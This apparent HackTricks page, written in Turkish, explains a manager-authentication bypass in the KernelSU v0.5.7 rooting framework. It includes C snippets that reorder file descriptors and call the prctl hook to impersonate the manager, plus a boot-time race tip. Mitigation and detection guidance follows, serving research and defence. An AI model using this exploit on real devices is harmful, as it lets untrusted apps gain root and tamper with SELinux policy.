# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU, APatch, SKRoot ve Magisk gibi rooting framework'leri, Linux/Android çekirdeğini sıkça yamanlar ve ayrıcalıklı işlevselliği, bir syscall ile bağlı bir "yönetici" uygulamasına açar. Eğer yönetici kimlik doğrulama adımı hatalıysa, herhangi bir yerel uygulama bu kanala ulaşabilir ve zaten köklenmiş cihazlarda ayrıcalıkları artırabilir.

Bu sayfa, hem kırmızı hem de mavi takımların saldırı yüzeylerini, istismar ilkelerini ve sağlam önlemleri anlamalarına yardımcı olmak için kamu araştırmalarında (özellikle Zimperium'un KernelSU v0.5.7 analizi) ortaya çıkan teknikleri ve tuzakları özetlemektedir.

---
## Mimari deseni: syscall-bağlı yönetici kanalı

- Çekirdek modülü/yaması, kullanıcı alanından "komutlar" almak için bir syscall'ı (genellikle prctl) bağlar.
- Protokol genellikle şudur: magic_value, command_id, arg_ptr/len ...
- Bir kullanıcı alanı yönetici uygulaması önce kimlik doğrulaması yapar (örneğin, CMD_BECOME_MANAGER). Çekirdek çağrıyı güvenilir bir yönetici olarak işaretlediğinde, ayrıcalıklı komutlar kabul edilir:
- Çağrıcıya kök verme (örneğin, CMD_GRANT_ROOT)
- su için izin listelerini/yasak listelerini yönetme
- SELinux politikasını ayarlama (örneğin, CMD_SET_SEPOLICY)
- Sürüm/konfigürasyon sorgulama
- Herhangi bir uygulama syscall'ları çağırabileceğinden, yönetici kimlik doğrulamasının doğruluğu kritik öneme sahiptir.

Örnek (KernelSU tasarımı):
- Bağlı syscall: prctl
- KernelSU işleyicisine yönlendirmek için magic değer: 0xDEADBEEF
- Komutlar arasında: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, vb.

---
## KernelSU v0.5.7 kimlik doğrulama akışı (uygulanan şekliyle)

Kullanıcı alanı prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) çağrısı yaptığında, KernelSU doğrular:

1) Yol ön eki kontrolü
- Sağlanan yol, çağrıcı UID'si için beklenen bir ön ek ile başlamalıdır, örneğin /data/data/<pkg> veya /data/user/<id>/<pkg>.
- Referans: core_hook.c (v0.5.7) yol ön eki mantığı.

2) Mülkiyet kontrolü
- Yol, çağrıcı UID'sine ait olmalıdır.
- Referans: core_hook.c (v0.5.7) mülkiyet mantığı.

3) FD tablosu taraması ile APK imza kontrolü
- Çağıran sürecin açık dosya tanımlayıcılarını (FD'leri) yineleyin.
- Yolunun /data/app/*/base.apk ile eşleştiği ilk dosyayı seçin.
- APK v2 imzasını ayrıştırın ve resmi yönetici sertifikası ile doğrulayın.
- Referanslar: manager.c (FD'leri yineleme), apk_sign.c (APK v2 doğrulama).

Tüm kontroller geçerse, çekirdek yöneticinin UID'sini geçici olarak önbelleğe alır ve o UID'den ayrıcalıklı komutları kabul eder.

---
## Zafiyet sınıfı: FD yinelemesinden "ilk eşleşen APK"ya güvenme

Eğer imza kontrolü, süreç FD tablosunda bulunan "ilk eşleşen /data/app/*/base.apk" ile bağlanıyorsa, aslında çağrıcının kendi paketini doğrulamıyor demektir. Bir saldırgan, kendi base.apk'sinden daha önce FD listesinde görünecek şekilde, meşru bir şekilde imzalanmış bir APK'yı (gerçek yöneticinin) önceden konumlandırabilir.

Bu dolaylı güven, ayrıcalıklı bir uygulamanın yöneticiyi taklit etmesine olanak tanır; yöneticinin imza anahtarına sahip olmadan.

Sömürülen ana özellikler:
- FD taraması, çağrıcının paket kimliğine bağlanmaz; yalnızca yol dizelerini kalıp eşleştirir.
- open() en düşük mevcut FD'yi döner. Daha düşük numaralı FD'leri önce kapatarak, bir saldırgan sıralamayı kontrol edebilir.
- Filtre yalnızca yolun /data/app/*/base.apk ile eşleşip eşleşmediğini kontrol eder - çağrıcının yüklü paketi ile ilgili olup olmadığını kontrol etmez.

---
## Saldırı ön koşulları

- Cihaz, zaten zayıf bir rooting framework'ü ile köklenmiştir (örneğin, KernelSU v0.5.7).
- Saldırgan, yerel olarak rastgele ayrıcalıksız kod çalıştırabilir (Android uygulama süreci).
- Gerçek yönetici henüz kimlik doğrulaması yapmamıştır (örneğin, bir yeniden başlatmadan hemen sonra). Bazı framework'ler, başarıdan sonra yönetici UID'sini önbelleğe alır; yarışı kazanmalısınız.

---
## Sömürü taslağı (KernelSU v0.5.7)

Yüksek seviyeli adımlar:
1) Ön ek ve mülkiyet kontrollerini karşılamak için kendi uygulama veri dizininize geçerli bir yol oluşturun.
2) Gerçek bir KernelSU Yönetici base.apk'sinin, kendi base.apk'nizden daha düşük numaralı bir FD'de açıldığından emin olun.
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) çağrısını yaparak kontrolleri geçin.
4) CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY gibi ayrıcalıklı komutlar vererek yükselmeyi sürdürün.

Adım 2 (FD sıralaması) ile ilgili pratik notlar:
- /proc/self/fd sembolik bağlantılarını yürüyerek kendi /data/app/*/base.apk'niz için sürecinizin FD'sini belirleyin.
- Düşük bir FD'yi (örneğin, stdin, fd 0) kapatın ve meşru yönetici APK'sını önce açarak fd 0'ı (veya kendi base.apk fd'nizden daha düşük bir indeksi) kaplayın.
- Meşru yönetici APK'sını uygulamanızla birleştirerek yolunun çekirdeğin basit filtresini karşılamasını sağlayın. Örneğin, /data/app/*/base.apk ile eşleşen bir alt yol altında yerleştirin.

Örnek kod parçacıkları (Android/Linux, yalnızca gösterim amaçlı):

Açık FD'leri listeleyerek base.apk girişlerini bulma:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Daha düşük numaralı bir FD'yi meşru yönetici APK'sına işaret edecek şekilde zorlayın:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Manager kimlik doğrulaması prctl hook aracılığıyla:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Başarıdan sonra, ayrıcalıklı komutlar (örnekler):
- CMD_GRANT_ROOT: mevcut süreci root olarak yükselt
- CMD_ALLOW_SU: paketini/UID'ni kalıcı su için izin listesine ekle
- CMD_SET_SEPOLICY: çerçeve tarafından desteklenen SELinux politikasını ayarla

Yarış/persistans ipucu:
- AndroidManifest'te bir BOOT_COMPLETED alıcısı kaydet (RECEIVE_BOOT_COMPLETED) böylece yeniden başlatmadan sonra erken başlar ve gerçek yöneticiden önce kimlik doğrulama girişiminde bulunur.

---
## Tespit ve hafifletme rehberi

Çerçeve geliştiricileri için:
- Kimlik doğrulamayı çağıranın paketine/UID'sine bağlayın, rastgele FD'lere değil:
- Çağıranın paketini UID'sinden çözün ve kurulu paketin imzasıyla doğrulayın (PackageManager aracılığıyla) FD'leri taramak yerine.
- Sadece çekirdekse, kararlı çağıran kimliğini (görev kimlik bilgileri) kullanın ve init/kullanıcı alanı yardımcıları tarafından yönetilen kararlı bir gerçeklik kaynağında doğrulayın, işlem FD'leri üzerinde değil.
- Kimlik olarak yol-ön ek kontrolünden kaçının; bunlar çağıran tarafından kolayca tatmin edilebilir.
- Kanal üzerinden nonce tabanlı meydan okuma-yanıt kullanın ve önyükleme sırasında veya önemli olaylarda önbelleğe alınmış yöneticinin kimliğini temizleyin.
- Mümkünse, genel sistem çağrılarını aşırı yüklemek yerine binder tabanlı kimlik doğrulamalı IPC'yi düşünün.

Savunucular/mavi takım için:
- Kökleme çerçevelerinin ve yöneticisi süreçlerinin varlığını tespit edin; çekirdek telemetriniz varsa şüpheli sihirli sabitlerle (örneğin, 0xDEADBEEF) prctl çağrılarını izleyin.
- Yönetilen filolarda, güvenilmeyen paketlerden önyükleme sonrası ayrıcalıklı yönetici komutlarını hızlı bir şekilde denemeye çalışan önyükleme alıcılarını engelleyin veya uyarın.
- Cihazların yamanmış çerçeve sürümlerine güncellendiğinden emin olun; güncelleme sırasında önbelleğe alınmış yönetici kimliklerini geçersiz kılın.

Saldırının sınırlamaları:
- Sadece zaten köklenmiş ve savunmasız bir çerçeveye sahip cihazları etkiler.
- Genellikle, meşru yöneticinin kimlik doğrulamasından önce bir yeniden başlatma/yarış penceresi gerektirir (bazı çerçeveler yöneticinin UID'sini sıfırlanana kadar önbelleğe alır).

---
## Çerçeveler arası ilgili notlar

- Şifre tabanlı kimlik doğrulama (örneğin, tarihsel APatch/SKRoot sürümleri) tahmin edilebilir/bruteforce edilebilir şifreler veya hatalı doğrulamalar varsa zayıf olabilir.
- Paket/imza tabanlı kimlik doğrulama (örneğin, KernelSU) prensipte daha güçlüdür ancak gerçek çağırana bağlanmalıdır, dolaylı nesnelere değil, FD taramalarına.
- Magisk: CVE-2024-48336 (MagiskEoP), olgun ekosistemlerin bile yöneticinin bağlamında kod yürütmeye yol açan kimlik sahteciliğine karşı hassas olabileceğini göstermiştir.

---
## Referanslar

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
